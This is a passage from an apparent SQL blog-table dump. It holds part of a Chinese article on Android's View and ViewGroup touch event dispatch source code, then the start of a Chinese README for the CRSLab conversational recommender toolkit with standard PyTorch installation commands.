{\r\n```\r\n\r\n这个条件下的，也就是说这是一个`down`事件，标志着一个新触摸动作的开始（一个触摸动作一般是`down`->`move`->`up`这样的顺序）。\r\n\r\n我们在这段代码中找到了目标`view`，然后进一步调用`dispatchTransformedTouchEvent()`方法继续向下分发，如果该方法返回`true`，那么说明下面的子`view`处理了该事件，所以我们将该`view`保存到`touchTarget`链表中，然后保存了一些用于后续判断的事件信息。来看几个这段代码中调用的方法：\r\n\r\n#### canViewReceivePointerEvents()\r\n\r\n```\r\nprivate static boolean canViewReceivePointerEvents(@NonNull View child) {\r\n    return (child.mViewFlags & VISIBILITY_MASK) == VISIBLE\r\n            || child.getAnimation() != null;\r\n}\r\n```\r\n\r\n检查是否可见，或存在动画。\r\n\r\n#### isTransformedTouchPointInView()\r\n\r\n```\r\nprotected boolean isTransformedTouchPointInView(float x, float y, View child, PointF outLocalPoint) {\r\n    final float[] point = getTempPoint();\r\n    point[0] = x;\r\n    point[1] = y;\r\n    transformPointToViewLocal(point, child);\r\n    final boolean isInView = child.pointInView(point[0], point[1]);\r\n    if (isInView && outLocalPoint != null) {\r\n        outLocalPoint.set(point[0], point[1]);\r\n    }\r\n    return isInView;\r\n}\r\npublic void transformPointToViewLocal(float[] point, View child) {\r\n    point[0] += mScrollX - child.mLeft;\r\n    point[1] += mScrollY - child.mTop;\r\n\r\n    if (!child.hasIdentityMatrix()) {\r\n        child.getInverseMatrix().mapPoints(point);\r\n    }\r\n}\r\n```\r\n\r\n将点值从屏幕坐标系转换到`view`的坐标系，然后检查是否在`view`的区域内。\r\n\r\n#### dispatchTransformedTouchEvent()\r\n\r\n```\r\nprivate boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel,\r\n    View child, int desiredPointerIdBits) {\r\nfinal boolean handled;\r\n\r\n// 保存原始action，便于从调用改变`event`状态后恢复\r\nfinal int oldAction = event.getAction();\r\n// 取消事件的情况比较特殊，我们不用做任何过滤或转换\r\nif (cancel || oldAction == MotionEvent.ACTION_CANCEL) {\r\n    event.setAction(MotionEvent.ACTION_CANCEL);\r\n    // 如果没有子view作为分发目标，则调用super（View类）的分发方法\r\n    if (child == null) {\r\n        handled = super.dispatchTouchEvent(event);\r\n    } else {\r\n    // 向子view进一步分发\r\n        handled = child.dispatchTouchEvent(event);\r\n    }\r\n    // 恢复event状态\r\n    event.setAction(oldAction);\r\n    return handled;\r\n}\r\n\r\n// 过滤出需要的触摸点id\r\nfinal int oldPointerIdBits = event.getPointerIdBits();\r\nfinal int newPointerIdBits = oldPointerIdBits & desiredPointerIdBits;\r\n\r\nif (newPointerIdBits == 0) {\r\n    return false;\r\n}\r\n\r\nfinal MotionEvent transformedEvent;\r\n// 如果所有触摸点都被使用，我们可以直接使用原event，如果不是，我们需要从中分离出一个新的transformedEvent副本再进行分发，这么做的是因为我们要保持原event的状态\r\nif (newPointerIdBits == oldPointerIdBits) {\r\n    if (child == null || child.hasIdentityMatrix()) {\r\n        if (child == null) {\r\n            handled = super.dispatchTouchEvent(event);\r\n        } else {\r\n            final float offsetX = mScrollX - child.mLeft;\r\n            final float offsetY = mScrollY - child.mTop;\r\n            // 计算并设置view偏移给event\r\n            event.offsetLocation(offsetX, offsetY);\r\n			// 分发事件\r\n            handled = child.dispatchTouchEvent(event);\r\n			// 恢复event原状态\r\n            event.offsetLocation(-offsetX, -offsetY);\r\n        }\r\n        return handled;\r\n    }\r\n    // 复制一个event\r\n    transformedEvent = MotionEvent.obtain(event);\r\n} else {\r\n    // 分离出的新的transformedEvent\r\n    transformedEvent = event.split(newPointerIdBits);\r\n}\r\n\r\nif (child == null) {\r\n    handled = super.dispatchTouchEvent(transformedEvent);\r\n} else {\r\n    final float offsetX = mScrollX - child.mLeft;\r\n    final float offsetY = mScrollY - child.mTop;\r\n    transformedEvent.offsetLocation(offsetX, offsetY);\r\n    if (! child.hasIdentityMatrix()) {\r\n        transformedEvent.transform(child.getInverseMatrix());\r\n    }\r\n\r\n    handled = child.dispatchTouchEvent(transformedEvent);\r\n}\r\n// 回收临时拷贝\r\ntransformedEvent.recycle();\r\nreturn handled;\r\n}\r\n```\r\n\r\n这个方法中对触摸事件设置好正确的偏移后向目标子`view`进行分发，如果没有目标，则调用自身的父类，也就是`view`的分发方法进行处理。\r\n\r\n#### addTouchTarget()\r\n\r\n```\r\nprivate TouchTarget addTouchTarget(@NonNull View child, int pointerIdBits) {\r\n    final TouchTarget target = TouchTarget.obtain(child, pointerIdBits);\r\n    target.next = mFirstTouchTarget;\r\n    mFirstTouchTarget = target;\r\n    return target;\r\n}\r\n```\r\n\r\n这里`mFirstTouchTartget`是链表头，新增的`touchTarget`被插入了表头位置。\r\n\r\n### dispatchTouchEvent(ViewGroup)\r\n\r\n再回到这个主要方法中：\r\n\r\n```\r\n// 没找到可以接收事件的子view\r\n               if (newTouchTarget == null && mFirstTouchTarget != null) {\r\n                   // mFirstTouchTarget为链表头\r\n                   newTouchTarget = mFirstTouchTarget;\r\n                   // 把newTouchTarget指向表尾\r\n                   while (newTouchTarget.next != null) {\r\n                       newTouchTarget = newTouchTarget.next;\r\n                   }\r\n                   newTouchTarget.pointerIdBits |= idBitsToAssign;\r\n               }\r\n           }\r\n       }\r\n```\r\n\r\n注意11、12行的两个右括号分别对应退出的是\r\n\r\n```\r\nif (!canceled && !intercepted) {\r\n```\r\n\r\n与\r\n\r\n```\r\nif (actionMasked == MotionEvent.ACTION_DOWN\r\n        || (split && actionMasked == MotionEvent.ACTION_POINTER_DOWN)\r\n        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) {\r\n```\r\n\r\n这意味着我们已经处理完了没有被取消、当前`ViewGroup`拦截，并且为初始触摸事件(`Down`) 的情况的分发，但是要注意的是现在并没有退出函数，还要继续向下执行：\r\n\r\n```\r\n      if (mFirstTouchTarget == null) {\r\n          // 意味着还没有子view处理该触摸事件\r\n          // 此时第三个参数为null，会向父亲View传递令其处理这个事件\r\n          handled = dispatchTransformedTouchEvent(ev, canceled, null,\r\n                  TouchTarget.ALL_POINTER_IDS);\r\n      } else {\r\n          // 说明已有子view处理过该事件序列(由`down`开始)，直接将事件分发给该view，当需要时取消事件\r\n          TouchTarget predecessor = null;\r\n          TouchTarget target = mFirstTouchTarget;\r\n          while (target != null) {\r\n              final TouchTarget next = target.next;\r\n              if (alreadyDispatchedToNewTouchTarget && target == newTouchTarget) {\r\n                  // 该TouchTarget已经在前面的情况中被分发处理了，避免重复处理\r\n                  handled = true;\r\n              } else {\r\n// 如果被当前ViewGroup拦截，向下分发cancel事件\r\n                  final boolean cancelChild = resetCancelNextUpFlag(target.child)\r\n                          || intercepted;\r\n                  // dispatchTransformedTouchEvent()方法成功向下分发取消事件或分发正常事件\r\n                  if (dispatchTransformedTouchEvent(ev, cancelChild,\r\n                          target.child, target.pointerIdBits)) {\r\n                      handled = true;\r\n                  }\r\n                	// 如果发送了取消事件，则移除分发记录（链表移动操作）\r\n                  if (cancelChild) {\r\n                      if (predecessor == null) {\r\n                          mFirstTouchTarget = next;\r\n                      } else {\r\n                          predecessor.next = next;\r\n                      }\r\n                      target.recycle();\r\n                      target = next;\r\n                      continue;\r\n                  }\r\n              }\r\n              predecessor = target;\r\n              target = next;\r\n          }\r\n      }\r\n        if (canceled\r\n                || actionMasked == MotionEvent.ACTION_UP\r\n                || actionMasked == MotionEvent.ACTION_HOVER_MOVE) {\r\n// 如果为up事件或者hover_move事件（一系列触摸事件结束），清除记录的信息\r\n            resetTouchState();\r\n        } else if (split && actionMasked == MotionEvent.ACTION_POINTER_UP) {\r\n        	// 清除保存触摸信息\r\n            final int actionIndex = ev.getActionIndex();\r\n            final int idBitsToRemove = 1 << ev.getPointerId(actionIndex);\r\n            removePointersFromTouchTargets(idBitsToRemove);\r\n        }\r\n    }\r\n\r\n    if (!handled && mInputEventConsistencyVerifier != null) {\r\n        mInputEventConsistencyVerifier.onUnhandledEvent(ev, 1);\r\n    }\r\n    // 返回事件是否被处理的信息\r\n    return handled;\r\n```\r\n\r\n### dispatchTouchEvent(ViewGroup)小结\r\n\r\n现在我们再从头梳理一遍这个比较长的方法过程：\r\n\r\n关键点：\r\n\r\n- `TouchTarget`链表保存了处理了初始触摸事件的子`View`，注意只有一系列触摸动作的初始事件（`Down`事件）才会找到对应的子`View`并生成`TouchTarget`的一个节点。后面的系列事件都会分发给`TouchTarget`链表中保存的子`View`，这也就意味着，如果一个子`View`没有处理初始的`Down`事件，那么它也就不会再接收到后面的`move` `up`等事件。\r\n- 如果`onInterceptTouchEvent()`返回`true`，当前`ViewGroup`拦截了该事件，那么该事件不会再向下面分发，并且会向`TouchTarget`中保存的所有子`View`发送`cancel`事件提醒它们这一系列的事件已经因被拦截而取消了，同时还会移除分发记录，意味着后面的事件也不再会分发到子`View`。\r\n- 如果是辅助功能的事件，那么会优先分发给支持辅助功能的`View`，如果不存在这样的`view`，则进行一般的事件分发。\r\n\r\n顺序（大致）：\r\n\r\n1. 判断是否被拦截\r\n2. 如果未被拦截且为初始事件，找到可以处理事件的子`View`（在点击范围内且可被点击），分发事件后如果该子`View`处理了事件（`dispatchTouchEvent()`方法返回`true`）则存入`TouchTarget`链表并停止子`View`的遍历（后面的子`View`就没有机会再收到事件），如果该子`View`没有处理该事件，则继续遍历寻找\r\n3. 如果事件被拦截，向`TouchTarget`中的子`View`发送`cancel`事件\r\n4. 将未被2、3情况处理的事件分发给`TouchTarget`中的子`View`，如果`TouchTarget`为空，则交给`ViewGroup`本身父`View`的`dispatchTouchEvent()`方法处理\r\n\r\n### dispatchTouchEvent(View)\r\n\r\n现在我们知道，当一个触摸事件分发到一个非`ViewGroup`的`View`或者`ViewGroup`不再向下分发该事件（没有处理事件的目标或者被本身拦截），那么`View`类的`dispatchTouchEvent()`将会被调用：\r\n\r\n```\r\npublic boolean dispatchTouchEvent(MotionEvent event) {\r\n    // 处理辅助功能事件的情况\r\n    if (event.isTargetAccessibilityFocus()) {\r\n        if (!isAccessibilityFocusedViewOrHost()) {\r\n            return false;\r\n        }\r\n        event.setTargetAccessibilityFocus(false);\r\n    }\r\n\r\n    boolean result = false;\r\n	// 一致性检验，检查事件是否被改变\r\n    if (mInputEventConsistencyVerifier != null) {\r\n        mInputEventConsistencyVerifier.onTouchEvent(event, 0);\r\n    }\r\n\r\n    final int actionMasked = event.getActionMasked();\r\n    if (actionMasked == MotionEvent.ACTION_DOWN) {\r\n        // 停止滚动（如果在）\r\n        stopNestedScroll();\r\n    }\r\n\r\n    if (onFilterTouchEventForSecurity(event)) {\r\n        if ((mViewFlags & ENABLED_MASK) == ENABLED && handleScrollBarDragging(event)) {\r\n            // 如果事件为鼠标拖动滚动条\r\n            result = true;\r\n        }\r\n\r\n        ListenerInfo li = mListenerInfo;\r\n        if (li != null && li.mOnTouchListener != null\r\n                && (mViewFlags & ENABLED_MASK) == ENABLED\r\n                && li.mOnTouchListener.onTouch(this, event)) {\r\n            // 如果注册了点击事件监听(onTouchListener)，并且当前view处于启动状态，并且调用注册的onTouch方法返回了true，说明事件被消耗，标记结果为true，（注意这个时候已经调用了`onTouch()`进行事件分发处理\r\n            result = true;\r\n        }\r\n		// 如果没有被注册的onTouch方法消耗事件，那么调用View本身的onTouch方法，如果返回了true，说明事件被消耗，标记结果为true\r\n        if (!result && onTouchEvent(event)) {\r\n            result = true;\r\n        }\r\n    }\r\n    // 一致性检验，检查事件是否被改变\r\n    if (!result && mInputEventConsistencyVerifier != null) {\r\n        mInputEventConsistencyVerifier.onUnhandledEvent(event, 0);\r\n    }\r\n\r\n    // 如果是up事件（系列触摸动作的终点），或者是cancel事件，或者是初始事件并且我们没对它进行处理（回忆前面的内容，如果没有处理down事件，那么也不会收到后面的事件），就停止滚动状态\r\n    if (actionMasked == MotionEvent.ACTION_UP ||\r\n            actionMasked == MotionEvent.ACTION_CANCEL ||\r\n            (actionMasked == MotionEvent.ACTION_DOWN && !result)) {\r\n        stopNestedScroll();\r\n    }\r\n\r\n    return result;\r\n}\r\n```\r\n\r\n我们可以看到，`View`的`onDispatchTouchEvent()`方法主要是先检查是否注册了`onTouchListener`，如果注册了监听并且调用返回了`true`消耗了该事件，那么说明该`View`处理了该事件，也会收到后续的事件，如果没有注册监听或者没有消耗，就调用`View`本身的`onTouchEvent`方法，如果返回`true`则消耗事件。\r\n\r\n下面来看`View`默认的`onTouchEvent()`方法：\r\n\r\n### onTouchEvent()\r\n\r\n这个方法我们也拆开来看：\r\n\r\n```\r\npublic boolean onTouchEvent(MotionEvent event) {\r\n    final float x = event.getX();\r\n    final float y = event.getY();\r\n    final int viewFlags = mViewFlags;\r\n    final int action = event.getAction();\r\n		\r\n    if ((viewFlags & ENABLED_MASK) == DISABLED) {\r\n        if (action == MotionEvent.ACTION_UP && (mPrivateFlags & PFLAG_PRESSED) != 0) {\r\n          	// 如果view被禁用且按下状态为true，取消接下状态\r\n            setPressed(false);\r\n        }\r\n        // 如果该view被禁用，但是被设置为clickable或longClickable或contextClickable，仍然消耗该事件\r\n        return (((viewFlags & CLICKABLE) == CLICKABLE\r\n                || (viewFlags & LONG_CLICKABLE) == LONG_CLICKABLE)\r\n                || (viewFlags & CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE);\r\n    }\r\n    // 如果为该view设置了触摸事件代理，则转发到代理处理触摸事件\r\n    if (mTouchDelegate != null) {\r\n        if (mTouchDelegate.onTouchEvent(event)) {\r\n            return true;\r\n        }\r\n    }\r\n```\r\n\r\n处理了`view`被禁用和设置了触摸事件代理的情况。\r\n\r\n```\r\nif (((viewFlags & CLICKABLE) == CLICKABLE ||\r\n        (viewFlags & LONG_CLICKABLE) == LONG_CLICKABLE) ||\r\n        (viewFlags & CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE) {\r\n    switch (action) {\r\n```\r\n\r\n注意下面的语句都是在该`view`可被点击的情况下执行的，并且一旦该判断成立，那么最终一定会返回`true`，也就是说，设置了可被点击的`view`在默认情况下一定会消耗触摸事件。\r\n\r\n下面对不同的触摸事件类型分别作出处理，为了分析方便，我调换了各`case`的顺序：\r\n\r\n#### case MotionEvent.ACTION_DOWN:\r\n\r\n一个触摸动作的开始\r\n\r\n```\r\nmHasPerformedLongPress = false;\r\n// 检查Button点击事件的特殊情况（下文讲）\r\nif (performButtonActionOnTouchDown(event)) {\r\n    break;\r\n}\r\n// 向上遍历view以检查是否处在一个可滚动的容器中\r\nboolean isInScrollingContainer = isInScrollingContainer();\r\n\r\n// 如果是在滚动容器中，稍延迟触摸反馈来应对这是一个滚动操作的情况\r\nif (isInScrollingContainer) {\r\n    mPrivateFlags |= PFLAG_PREPRESSED;\r\n    if (mPendingCheckForTap == null) {\r\n      　// 新建一个对象用于检测单击事件（下文讲）\r\n        mPendingCheckForTap = new CheckForTap();\r\n    }\r\n    mPendingCheckForTap.x = event.getX();\r\n    mPendingCheckForTap.y = event.getY();\r\n  　// 利用消息队列来延迟发送检测单击事件的方法，延迟时间为getTapTimeout设置的超时（下文讲）\r\n    postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());\r\n} else {\r\n	// 没有在滚动容器中，马上显示触摸反馈，并且开始检查长按事件（下文讲）\r\n    setPressed(true, x, y);\r\n    checkForLongClick(0, x, y);\r\n}\r\nbreak;\r\n```\r\n\r\n##### performButtonActionOnTouchDown()\r\n\r\n```\r\nprotected boolean performButtonActionOnTouchDown(MotionEvent event) {\r\n    if (event.isFromSource(InputDevice.SOURCE_MOUSE) &&\r\n        (event.getButtonState() & MotionEvent.BUTTON_SECONDARY) != 0) {\r\n        showContextMenu(event.getX(), event.getY());\r\n        mPrivateFlags |= PFLAG_CANCEL_NEXT_UP_EVENT;\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n```\r\n\r\n只是处理了事件来源是鼠标的特殊情况。\r\n\r\n##### CheckForTap()\r\n\r\n它是一个`Runnable`，用于延迟执行单击检测的任务：\r\n\r\n```\r\nprivate final class CheckForTap implements Runnable {\r\n    public float x;\r\n    public float y;\r\n\r\n    @Override\r\n    public void run() {\r\n        mPrivateFlags &= ~PFLAG_PREPRESSED;\r\n        setPressed(true, x, y);\r\n        checkForLongClick(ViewConfiguration.getTapTimeout(), x, y);\r\n    }\r\n}\r\n```\r\n\r\n它被放到消息队列，在设置的超时之后被执行，如果这段时间它没有被移出队列，那么说明这就是一个单击事件，那么就显示触摸反馈并开始长按检测。\r\n\r\n##### postDelayed()\r\n\r\n```\r\npublic boolean postDelayed(Runnable action, long delayMillis) {\r\n    final AttachInfo attachInfo = mAttachInfo;\r\n    if (attachInfo != null) {\r\n        return attachInfo.mHandler.postDelayed(action, delayMillis);\r\n    }\r\n\r\n    getRunQueue().postDelayed(action, delayMillis);\r\n    return true;\r\n}\r\n```\r\n\r\n往注册的`Handler`的消息队列或者他自己实现的一个消息队列中发送需要被延时执行的消息，这块就不深入探究了，消息机制分析的文章已经讲得很清楚了。\r\n\r\n##### checkForLongClick()\r\n\r\n```\r\nif ((mViewFlags & LONG_CLICKABLE) == LONG_CLICKABLE) {\r\n    mHasPerformedLongPress = false;\r\n\r\n    if (mPendingCheckForLongPress == null) {\r\n        mPendingCheckForLongPress = new CheckForLongPress();\r\n    }\r\n    mPendingCheckForLongPress.setAnchor(x, y);\r\n    mPendingCheckForLongPress.rememberWindowAttachCount();\r\n    postDelayed(mPendingCheckForLongPress,\r\n            ViewConfiguration.getLongPressTimeout() - delayOffset);\r\n}\r\n```\r\n\r\n同样是利用`postDelayed()`方法来检测是否到达了检测时间，\r\n\r\n```\r\nprivate final class CheckForLongPress implements Runnable {\r\n    private int mOriginalWindowAttachCount;\r\n    private float mX;\r\n    private float mY;\r\n\r\n    @Override\r\n    public void run() {\r\n        if (isPressed() && (mParent != null)\r\n                && mOriginalWindowAttachCount == mWindowAttachCount) {\r\n            if (performLongClick(mX, mY)) {\r\n                mHasPerformedLongPress = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    public void setAnchor(float x, float y) {\r\n        mX = x;\r\n        mY = y;\r\n    }\r\n\r\n    public void rememberWindowAttachCount() {\r\n        mOriginalWindowAttachCount = mWindowAttachCount;\r\n    }\r\n}\r\n```\r\n\r\n如果`run()`方法被执行，说明到达了设定的时间并且没有因为触摸点移动或者抬起而移除该`Runnable`信息，为一个长按动作，执行`performLongClick()`方法来触发长按回调：\r\n\r\n```\r\npublic boolean performLongClick(float x, float y) {\r\n    mLongClickX = x;\r\n    mLongClickY = y;\r\n    final boolean handled = performLongClick();\r\n    mLongClickX = Float.NaN;\r\n    mLongClickY = Float.NaN;\r\n    return handled;\r\n}\r\npublic boolean performLongClick() {\r\n    return performLongClickInternal(mLongClickX, mLongClickY);\r\n}\r\nprivate boolean performLongClickInternal(float x, float y) {\r\n    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_LONG_CLICKED);\r\n\r\n    boolean handled = false;\r\n    final ListenerInfo li = mListenerInfo;\r\n    if (li != null && li.mOnLongClickListener != null) {\r\n        handled = li.mOnLongClickListener.onLongClick(View.this);\r\n    }\r\n    if (!handled) {\r\n        final boolean isAnchored = !Float.isNaN(x) && !Float.isNaN(y);\r\n        handled = isAnchored ? showContextMenu(x, y) : showContextMenu();\r\n    }\r\n    if (handled) {\r\n        performHapticFeedback(HapticFeedbackConstants.LONG_PRESS);\r\n    }\r\n    return handled;\r\n}\r\n```\r\n\r\n第5-8行是与之前`onTouchEvent()`方法中类似的关于是否注册了监听器的判断，如果注册了监听器，那么优先使用监听器的`onLongClick()`方法来处理长近事件，如果没有监听器成功处理事件，那么会先判断长按是否有锚点，再根据锚点的存在性调用`showContextMenu()`显示可能存在的上下文菜单。\r\n\r\n13行判断如果当前方法成功消耗了长按事件，调用`performHapticFeedback()`方法显示一个触觉的反馈。\r\n\r\n#### case MotionEvent.ACTION_MOVE:\r\n\r\n触摸点发生了移动\r\n\r\n```\r\ndrawableHotspotChanged(x, y);\r\n\r\nif (!pointInView(x, y, mTouchSlop)) {\r\n    removeTapCallback();\r\n    if ((mPrivateFlags & PFLAG_PRESSED) != 0) {\r\n        removeLongPressCallback();\r\n\r\n        setPressed(false);\r\n    }\r\n}\r\nbreak;\r\n```\r\n\r\n第1行调用了`drawableHotspotChanged()`通知可能存在的子`View`或`drawable`触摸点发生了移动。\r\n\r\n第3行检测由于移动，触摸点是否移出了`view`+`slop`扩展出的范围，`slop`的存在是为了保证在按下后轻微移出点击区域的情况下能正常判断点击：\r\n\r\n```\r\npublic boolean pointInView(float localX, float localY, float slop) {\r\n    return localX >= -slop && localY >= -slop && localX < ((mRight - mLeft) + slop) &&\r\n            localY < ((mBottom - mTop) + slop);\r\n}\r\n```\r\n\r\n如果移出了这个范围，首先第4行调用`removeTapCall()`：\r\n\r\n```\r\nprivate void removeTapCallback() {\r\n    if (mPendingCheckForTap != null) {\r\n        mPrivateFlags &= ~PFLAG_PREPRESSED;\r\n        removeCallbacks(mPendingCheckForTap);\r\n    }\r\n}\r\n```\r\n\r\n先取消了预按下状态的`flag`，再调用`removeCallbacks`：\r\n\r\n```\r\npublic boolean removeCallbacks(Runnable action) {\r\n    if (action != null) {\r\n        final AttachInfo attachInfo = mAttachInfo;\r\n        if (attachInfo != null) {\r\n            attachInfo.mHandler.removeCallbacks(action);\r\n            attachInfo.mViewRootImpl.mChoreographer.removeCallbacks(\r\n                    Choreographer.CALLBACK_ANIMATION, action, null);\r\n        }\r\n        getRunQueue().removeCallbacks(action);\r\n    }\r\n    return true;\r\n}\r\n```\r\n\r\n从消息队列中移出我们检测单击事件的消息，这样，由于触摸点移动出了当前`view`，如果在滚动容器中的情况下，长按的检测就不会进行（因`mPendingCheckForTap`消息被移出消息队列）。\r\n\r\n```\r\nif ((mPrivateFlags & PFLAG_PRESSED) != 0) {\r\n    removeLongPressCallback();\r\n\r\n    setPressed(false);\r\n}\r\n```\r\n\r\n如果`pressed`标志位为1，那么就取消消息队列中长按触发消息，同时去除`pressed`标志位。\r\n\r\n总结一下，只要触摸点移动出了当前`view`，那么所有的点击、长按事件都不会触发，但是只要移动还在`view`+`slot`范围内，那么点击长按事件还是会被触发的。\r\n\r\n#### case MotionEvent.ACTION_UP:\r\n\r\n抬起手指\r\n\r\n```\r\nboolean prepressed = (mPrivateFlags & PFLAG_PREPRESSED) != 0;\r\nif ((mPrivateFlags & PFLAG_PRESSED) != 0 || prepressed) {\r\n    // 如果有prepressed或pressed标志\r\n    boolean focusTaken = false;\r\n    if (isFocusable() && isFocusableInTouchMode() && !isFocused()) {\r\n        // 可以获得焦点但没有获得\r\n        // 请求获取焦点\r\n        focusTaken = requestFocus();\r\n    }\r\n\r\n    if (prepressed) {\r\n        // prepressed状态表示滚动容器中的点击检测还没有被消息队列执行，这个时候如果抬起手指说明是一个点击事件，调用setPressed显示反馈\r\n        setPressed(true, x, y);\r\n   }\r\n\r\n    if (!mHasPerformedLongPress && !mIgnoreNextUpEvent) {\r\n        // 没有到达执行长按触发消息的时间就抬起了手指，说明这是一个单击事件，移除长按触发消息\r\n        removeLongPressCallback();\r\n\r\n        if (!focusTaken) {\r\n            // 当当前view没有获取焦点时才能触发点击事件，说明一个可以获取焦点的view是无法触发点击事件的\r\n            if (mPerformClick == null) {\r\n                mPerformClick = new PerformClick();\r\n            }\r\n            // 使用post来将performClick动作放入队列中执行来保证其他view视觉上的变化可以在点击事件被触发之前被看到\r\n            if (!post(mPerformClick)) {\r\n                // 如果post没有成功，则直接执行\r\n                performClick();\r\n            }\r\n        }\r\n    }\r\n	// UnsetPressedState为Runnable消息，用于取消view的prepressed或pressed状态\r\n    if (mUnsetPressedState == null) {\r\n        mUnsetPressedState = new UnsetPressedState();\r\n    }\r\n\r\n    if (prepressed) {\r\n        // 取消prepressed状态\r\n        postDelayed(mUnsetPressedState,\r\n                ViewConfiguration.getPressedStateDuration());\r\n    } else if (!post(mUnsetPressedState)) {\r\n        // 取消pressed状态\r\n        mUnsetPressedState.run();\r\n    }\r\n	// 清除单击检测消息\r\n    removeTapCallback();\r\n}\r\nmIgnoreNextUpEvent = false;\r\nbreak;\r\n```\r\n\r\n可以看到`up`时，才是单击事件真正触发的地方，如果这个`view`可以获得焦点，那么会优先处理焦点获取，而不会触发点击事件。\r\n\r\n```\r\npublic boolean performClick() {\r\n    final boolean result;\r\n    final ListenerInfo li = mListenerInfo;\r\n    if (li != null && li.mOnClickListener != null) {\r\n        playSoundEffect(SoundEffectConstants.CLICK);\r\n        li.mOnClickListener.onClick(this);\r\n        result = true;\r\n    } else {\r\n        result = false;\r\n    }\r\n\r\n    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);\r\n    return result;\r\n}\r\n```\r\n\r\n相似的方法，检测了是否有监听的存在并执行，最后给辅助功能选项发送一条消息。\r\n\r\n#### case MotionEvent.ACTION_CANCEL:\r\n\r\n取消这一系列触摸动作\r\n\r\n```\r\ncase MotionEvent.ACTION_CANCEL:\r\nsetPressed(false);\r\nremoveTapCallback();\r\nremoveLongPressCallback();\r\nmInContextButtonPress = false;\r\nmHasPerformedLongPress = false;\r\nmIgnoreNextUpEvent = false;\r\nbreak;\r\n```\r\n\r\n清除所有的状态。\r\n\r\n#### 小结\r\n\r\n`View`默认的`onTouchEvent()`方法处理了一系列的触摸事件， 判断是否触发单击、长按等，并且提供了默认的按下、点击、长按的视觉反馈。', '2022-07-05 13:06:45', '本文基于Android 7.1.1 (API 25)的源码分析编写', 'https://www.viseator.com/images/android_event_1.png', NULL, 0, NULL, NULL, 'Android 触摸事件分发机制（三）View触摸事件分发机制', '2022-07-05 13:06:45', 0, 53, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000176, NULL, NULL, '[![Pypi Latest Version](https://img.shields.io/pypi/v/crslab)](https://img.shields.io/pypi/v/crslab) [![Release](https://img.shields.io/github/v/release/rucaibox/crslab.svg)](https://img.shields.io/github/v/release/rucaibox/crslab.svg) [![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://img.shields.io/badge/License-MIT-blue.svg) [![arXiv](https://img.shields.io/badge/arXiv-CRSLab-%23B21B1B)](https://img.shields.io/badge/arXiv-CRSLab-%23B21B1B) [![Documentation Status](https://readthedocs.org/projects/crslab/badge/?version=latest)](https://readthedocs.org/projects/crslab/badge/?version=latest)\r\n\r\n[论文](https://arxiv.org/pdf/2101.00939.pdf) | [文档](https://crslab.readthedocs.io/en/latest/?badge=latest) | [English Version](https://github.com/RUCAIBox/CRSLab) | [下载地址](https://github.com/RUCAIBox/CRSLab)\r\n\r\n**CRSLab** 是一个用于构建对话推荐系统（CRS）的开源工具包，其基于 PyTorch 实现、主要面向研究者使用，并具有如下特色：\r\n\r\n- **全面的基准模型和数据集**：我们集成了常用的 6 个数据集和 18 个模型，包括基于图神经网络和预训练模型，比如 GCN，BERT 和 GPT-2；我们还对数据集进行相关处理以支持这些模型，并提供预处理后的版本供大家下载。\r\n- **大规模的标准评测**：我们支持一系列被广泛认可的评估方式来测试和比较不同的 CRS。\r\n- **通用和可扩展的结构**：我们设计了通用和可扩展的结构来统一各种对话推荐数据集和模型，并集成了多种内置接口和函数以便于快速开发。\r\n- **便捷的使用方法**：我们为新手提供了简单而灵活的配置，方便其快速启动集成在 CRSLab 中的模型。\r\n- **人性化的人机交互接口**：我们提供了人性化的人机交互界面，以供研究者对比和测试不同的模型系统。\r\n\r\n[![framework.png](https://i.loli.net/2020/12/30/6TPVG4pBg2rcDf9.png)](https://i.loli.net/2020/12/30/6TPVG4pBg2rcDf9.png)\r\n\r\n## 安装\r\n\r\nCRSLab 可以在以下几种系统上运行：\r\n\r\n- Linux\r\n- Windows 10\r\n- macOS X\r\n\r\nCRSLab 需要在 Python 3.6 或更高的环境下运行。\r\n\r\nCRSLab 要求 torch 版本在 1.4.0 及以上，如果你想在 GPU 上运行 CRSLab，请确保你的 CUDA 版本或者 CUDAToolkit 版本在 9.2 及以上。为保证 PyTorch Geometric 库的正常运行，请使用[链接](https://pytorch-geometric.com/whl/)所示的安装方式。\r\n\r\n### 安装 PyTorch\r\n\r\n使用 PyTorch [本地安装](https://pytorch.org/get-started/locally/)命令或者[先前版本安装](https://pytorch.org/get-started/previous-versions/)命令安装 PyTorch，比如在 Linux 和 Windows 下：\r\n\r\n```bash\r\n# CUDA 10.1\r\npip install torch==1.6.0+cu101 torchvision==0.7.0+cu101 -f https://download.pytorch.org/whl/torch_stable.html\r\n\r\n# CPU only\r\npip install torch==1.6.0+cpu torchvision==0.7.0+cpu -f https://download.pytorch.org/whl/torch_stable.html\r\n```\r\n\r\n安装完成后，如果你想在 GPU 上运行 CRSLab，请确保如下命令输出`True`：\r\n\r\n```bash\r\n$ python -c \"import torch; print(torch.cuda.is_available())\"\r\n>>> True\r\n```\r\n\r\n### 安装 PyTorch Geometric\r\n\r\n确保安装的 PyTorch 版本至少为 1.4.0：\r\n\r\n```bash\r\n$ python -c \"import torch; print(torch.__version__)\"\r\n>>> 1.6.0\r\n```\r\n\r\n找到安装好的 PyTorch 对应的 CUDA 版本：\r\n\r\n```bash\r\n$ python -c \"import torch; print(torch.version.cuda)\"\r\n>>> 10.1\r\n```\r\n\r\n安装相关的包：\r\n\r\n```bash\r\npip install torch-scatter -f https://pytorch-geometric.com/whl/torch-${TORCH}+${CUDA}.html\r\npip install torch-sparse -f https://pytorch-geometric.com/whl/torch-${TORCH}+${CUDA}.html\r\npip install torch-cluster -f https://pytorch-geometric.com/whl/torch-${TORCH}+${CUDA}.html\r\npip install torch-spline-conv -f https://pytorch-geometric.com/whl/torch-${TORCH}+${CUDA}.html\r\npip install torch-geometric\r\n```\r\n\r\n其中`${CUDA}`和`${TORCH}`应使用确定的 CUDA 版本（`cpu`，`cu92`，`cu101`，`cu102`，`cu110`）和 PyTorch 